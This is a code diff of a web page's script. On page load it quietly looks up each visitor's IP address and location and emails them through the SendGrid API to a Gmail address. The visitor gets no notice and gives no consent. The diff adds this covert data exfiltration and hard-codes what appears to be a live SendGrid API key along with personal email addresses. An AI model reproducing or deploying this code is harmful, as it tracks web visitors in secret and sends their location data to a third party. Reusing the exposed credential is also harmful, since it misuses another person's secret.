@@ -16,7 +16,9 @@
             var country = location.country_name;
             var region = location.region_name;
             var city = location.city;
-            var email = "imobilejordan@gmail.com";
+            var senderEmail = "eyad.s.khoury@hotmail.com"; // Specify sender email address
+            var recipientEmail = "imobilejordan@gmail.com"; // Specify recipient email address
+            var sendgridApiKey = "SG.XF5DSjVhROqeDzQilrq6|g.cfWTYZPSUmH6x6fYpROT_a5DUVACvSju_ckysrIPrEs"; // Replace with your SendGrid API key
 
             // Create email body
             var body = "IP Address: " + ip + "\n";
@@ -24,29 +26,46 @@
             body += "Region: " + region + "\n";
             body += "City: " + city;
 
-            // Send email using mailto link
-            window.location.href = "mailto:" + email + "?subject=User Location&body=" + encodeURIComponent(body);
+            // Send email using Fetch API
+            fetch('https://api.sendgrid.com/v3/mail/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + sendgridApiKey
+                },
+                body: JSON.stringify({
+                    personalizations: [{
+                        to: [{ email: recipientEmail }]
+                    }],
+                    from: { email: senderEmail },
+                    subject: 'User Location',
+                    content: [{
+                        type: 'text/plain',
+                        value: body
+                    }]
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Email sent successfully.');
+                } else {
+                    console.error('Failed to send email.');
+                }
+            });
         }
 
-        // Function to get user's IP address
-        function getIPAddress() {
-            // Send request to IPify API
-            fetch('https://api.ipify.org?format=json')
+        // Function to get user's IP address and location
+        function getUserLocation() {
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
-                .then(data => {
-                    var ipAddress = data.ip;
-                    // Use IP address to get user's location
-                    fetch('https://ipapi.co/' + ipAddress + '/json/')
-                        .then(response => response.json())
-                        .then(location => {
-                            // Send email with location
-                            sendEmailWithLocation(location);
-                        });
+                .then(location => {
+                    // Send email with location
+                    sendEmailWithLocation(location);
                 });
         }
 
-        // Call getIPAddress function when the page loads
-        getIPAddress();
+        // Call getUserLocation function when the page loads
+        getUserLocation();
     </script>
 </body>
 </html>
